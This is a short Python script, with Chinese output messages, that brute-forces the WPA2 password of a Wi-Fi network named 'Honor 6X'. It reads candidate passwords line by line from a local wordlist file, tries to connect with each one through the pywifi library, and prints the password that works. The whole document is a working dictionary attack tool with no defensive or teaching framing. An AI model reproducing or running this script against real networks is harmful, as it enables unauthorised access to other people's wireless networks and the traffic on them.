import pywifi,time
from pywifi import const

path=r"D:\mutou.txt"
file = open(path,"r",errors="ignore")
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
iface.disconnect()
time.sleep(1)




def test_Connect(wifiname,findstr):
    profile = pywifi.Profile()
    profile.ssid=wifiname
    profile.auth= const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = findstr.strip()
    iface.remove_all_network_profiles()
    tmp_profile=iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(0.4)

    sttaeee=iface.status()
    if  iface.status() == const.IFACE_CONNECTED:
        isOK=True
    else:
        isOK=False
    iface.disconnect()
    return isOK



def readPwd():
    print('开始破解：')
    while True:
        try:
            mystr = file.readline()
            if not mystr:
                break
            bool1=test_Connect("Honor 6X",mystr)
            if bool1:
                print('密码正确',mystr)
                break
            else:
                print("密码错误")
                # time.sleep(5)
        except:
            continue


readPwd()



